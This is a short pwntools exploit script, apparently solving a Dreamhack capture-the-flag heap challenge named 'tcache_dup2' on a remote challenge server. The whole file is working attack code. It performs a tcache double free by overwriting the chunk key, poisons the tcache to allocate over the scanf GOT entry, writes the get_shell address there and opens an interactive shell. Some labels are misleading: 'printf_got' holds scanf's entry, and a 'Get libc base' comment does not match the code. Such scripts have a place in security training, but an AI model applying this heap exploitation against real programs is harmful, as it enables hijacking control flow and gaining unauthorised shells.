# Name: tcache_poison.py
#!/usr/bin/python3
from pwn import *

p = remote("host1.dreamhack.games", 15975)
# p = process("./tcache_dup2")
e = ELF("./tcache_dup2")

# gdb.attach(p)

def slog(symbol, addr): return success(symbol + ": " + hex(addr))

context.log_level = 'debug'

def alloc(size, data):
    p.sendlineafter("> ", "1")
    p.sendlineafter(":", str(size))
    p.sendafter(":", data)

def edit(idx, size, data):
    p.sendlineafter("> ", "2")
    p.sendlineafter(":", str(idx))
    p.sendlineafter(":", str(size))
    p.sendafter(":", data)

def free(idx):
    p.sendlineafter("> ", "3")
    p.sendlineafter(":", str(idx))

get_shell = e.symbols["get_shell"]
printf_got = e.got["__isoc99_scanf"]

slog("get_shell", get_shell)
slog("printf_got", printf_got)
slog("read_got", e.got["read"])

#[1]Tcache duplication
alloc(0x30, "junthe")
free(0)
edit(0,0x10,"BBBBBBBB"+"\xff")
free(0)

alloc(0x30, "junthe")
free(1)
edit(1,0x10,"BBBBBBBB"+"\xff")
free(1)

#[2]Get libc base
alloc(0x30, p64(printf_got))
alloc(0x30, "AA")
alloc(0x30, p64(get_shell))

# edit(10,0x10,"BB")

p.interactive()